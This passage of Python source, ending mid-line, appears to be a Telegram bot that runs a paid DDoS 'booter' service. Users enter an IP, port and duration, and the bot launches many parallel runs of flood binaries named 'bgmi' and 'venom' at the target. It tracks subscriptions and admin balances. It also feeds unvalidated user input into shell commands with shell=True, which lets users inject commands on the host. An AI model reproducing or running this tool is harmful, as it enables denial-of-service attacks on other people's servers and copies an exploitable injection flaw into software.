import telebot
import subprocess
import datetime
import os
import time
import json
import shutil
import logging
from telebot import types
from threading import Thread, Lock
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Configuration Loading ---
CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config_data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config_data, f, indent=4)

config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config.get('admin_ids', []))
USER_FILE = config.get('user_file', 'users.json')
LOG_FILE = config.get('log_file', 'bot.log')
admin_balances = config.get('admin_balances', {})

# Binary Paths
ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
ORIGINAL_VENOM_PATH = '/root/venom/venom'

# Lock for thread-safe operations
bot_lock = Lock()

# --- Helper Functions ---
def read_users():
    try:
        if not os.path.exists(USER_FILE): return {}
        with open(USER_FILE, 'r') as f:
            data = json.load(f)
            return {uid: datetime.datetime.fromisoformat(exp) for uid, exp in data.items()}
    except Exception as e:
        logger.error(f"Error reading users: {e}")
        return {}

def write_users(users_dict):
    with open(USER_FILE, 'w') as f:
        json.dump({uid: exp.isoformat() for uid, exp in users_dict.items()}, f)

allowed_user_ids = read_users()

def is_authorized(user_id):
    return user_id in ADMIN_IDS or str(user_id) in allowed_user_ids

def admin_only(func):
    def wrapper(message):
        if message.from_user.id in ADMIN_IDS:
            return func(message)
        bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
    return wrapper

# --- Shell & Threading Logic ---
def shell_executor(command):
    """Thread-safe shell execution."""
    try:
        with bot_lock:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return process
    except Exception as e:
        logger.error(f"Shell execution failed: {e}")
        return None

def run_attack_process(target, port, duration, b_path, v_path, thread_count=20):
    """Thread-safe attack process execution."""
    cmd_bgmi = f"{b_path} {target} {port} {duration} 200"
    cmd_venom = f"{v_path} {target} {port} {duration} 200"
    
    processes = []
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count // 2):
            processes.append(executor.submit(shell_executor, cmd_bgmi))
            processes.append(executor.submit(shell_executor, cmd_venom))
    
    return processes

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('🚀 Attack'), types.KeyboardButton('ℹ️ My Info'))
    bot.send_message(message.chat.id, "🔰 **BOT READY** 🔰", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def attack_request(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "🎯 **Enter IP, Port, and Duration:**\nExample: `1.1.1.1 80 120`", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_attack)
    else:
        bot.send_message(message.chat.id, "🚫 **Unauthorized!**")

def process_attack(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")
            return
            
        target, port, duration = args[0], args[1], args[2]
        if int(duration) > 240:
            bot.reply_to(message, "❌ Max time is 240s.")
            return

        u_id = str(message.chat.id)
        b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
        v_path = OR
